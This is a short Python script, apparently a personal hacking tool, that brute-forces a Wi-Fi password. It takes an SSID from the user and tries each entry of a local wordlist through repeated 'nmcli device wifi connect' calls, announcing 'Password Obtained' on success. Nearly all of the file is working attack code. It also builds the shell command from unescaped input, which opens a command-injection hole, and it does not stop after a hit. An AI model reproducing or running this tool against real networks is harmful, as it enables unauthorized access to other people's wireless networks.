#!/usr/bin/python3

import sys
import os
import time

flag = False

print("___ Enter the SSID ___ \n")
ssid = input("SSID:")


def pas():
	os.chdir('/home/alex/Documents/Hacking')
	with open ("passwords.txt","r") as f :
		for line in f:
		    yield line.strip()

banner = """




_____BRUTEFORCER STARTING_____



\n """ 
								
for i in banner:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(0.05)
    
time.sleep(0.02)
								

stm = "nmcli device wifi connect"

pswd_lst = pas()


for pswd in pswd_lst:

    if len(pswd) < 8:
        continue

    try:
	    cmd = (f"nmcli device wifi connect {ssid} password {pswd}")
	    print("trying : " + pswd)
	    result = os.system(cmd)
	    
	    time.sleep(2)
	    
	    if (result == 0):
	        print(f"Password Obtained {pswd}")
	        
	    else: 
	        print(f"-- Incorrect password {pswd}")
    except OSError:
        print("+++ == AN ERROR OCCURED == +++")
        break

end_msg = " ___ BRUTEFORCE completed ___"

for i in end_msg:
    sys.stdout.write(i)
    sys.stdout.flush()
    time.sleep(0.05)
    















